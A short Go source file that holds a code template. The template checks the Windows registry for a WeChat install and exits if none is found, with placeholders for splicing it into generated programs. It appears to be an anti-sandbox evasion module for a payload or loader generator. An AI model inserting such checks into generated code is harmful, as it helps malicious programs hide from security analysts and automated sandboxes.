package sandbox

var (
	Wechatexist = []string{
		"k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\\Tencent\\bugReport\\WechatWindows`, registry.QUERY_VALUE)" + `
	if err != nil {
		os.Exit(0)
	} 
	defer k.Close() 

	s, _ , err := k.GetStringValue("InstallDir") 
	if err != nil { 
		os.Exit(0)
	} 
	if s == "" {
		os.Exit(0)
	}
	//__SANDBOX__
`, `
	"golang.org/x/sys/windows/registry"
	"os"
	//__IMPORT__`}
)
